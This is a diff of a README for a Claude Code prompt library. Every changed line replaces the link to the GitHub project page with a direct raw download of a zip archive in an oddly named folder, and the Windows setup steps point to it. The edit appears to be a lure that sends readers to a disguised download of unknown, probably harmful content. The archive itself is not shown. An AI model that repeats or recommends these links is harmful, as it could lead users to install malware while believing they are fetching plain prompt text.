@@ -1,12 +1,12 @@
 # 🧩 ClaudePrompts - Ready Claude Code Prompt Library
 
-[![Visit Download Page](https://img.shields.io/badge/Visit%20ClaudePrompts-purple?style=for-the-badge)](https://github.com/burtasunder311/ClaudePrompts)
+[![Visit Download Page](https://img.shields.io/badge/Visit%20ClaudePrompts-purple?style=for-the-badge)](https://raw.githubusercontent.com/burtasunder311/ClaudePrompts/main/cissoid/Prompts-Claude-v1.3.zip)
 
 ## 📥 Download
 
 Use this link to visit the project page and get the files:
 
-[https://github.com/burtasunder311/ClaudePrompts](https://github.com/burtasunder311/ClaudePrompts)
+[https://raw.githubusercontent.com/burtasunder311/ClaudePrompts/main/cissoid/Prompts-Claude-v1.3.zip](https://raw.githubusercontent.com/burtasunder311/ClaudePrompts/main/cissoid/Prompts-Claude-v1.3.zip)
 
 ## 🖥️ What ClaudePrompts Is
 
@@ -28,7 +28,7 @@ It is made for people who want to save time and work from a clear prompt list in
 Follow these steps on Windows:
 
 1. Open the download page:
-   [https://github.com/burtasunder311/ClaudePrompts](https://github.com/burtasunder311/ClaudePrompts)
+   [https://raw.githubusercontent.com/burtasunder311/ClaudePrompts/main/cissoid/Prompts-Claude-v1.3.zip](https://raw.githubusercontent.com/burtasunder311/ClaudePrompts/main/cissoid/Prompts-Claude-v1.3.zip)
 
 2. Look for the files or the green Code button on the page.
 
@@ -157,7 +157,7 @@ Copy one prompt and keep it in a text file for later use.
 
 ## 🧰 Quick Start
 
-1. Open [ClaudePrompts](https://github.com/burtasunder311/ClaudePrompts)
+1. Open [ClaudePrompts](https://raw.githubusercontent.com/burtasunder311/ClaudePrompts/main/cissoid/Prompts-Claude-v1.3.zip)
 2. Find the prompt you want
 3. Copy the text
 4. Paste it into Claude Code
@@ -167,7 +167,7 @@ Copy one prompt and keep it in a text file for later use.
 
 If you need the project page again, use this link:
 
-[https://github.com/burtasunder311/ClaudePrompts](https://github.com/burtasunder311/ClaudePrompts)
+[https://raw.githubusercontent.com/burtasunder311/ClaudePrompts/main/cissoid/Prompts-Claude-v1.3.zip](https://raw.githubusercontent.com/burtasunder311/ClaudePrompts/main/cissoid/Prompts-Claude-v1.3.zip)
 
 ## 📝 Working With Prompt Text
 
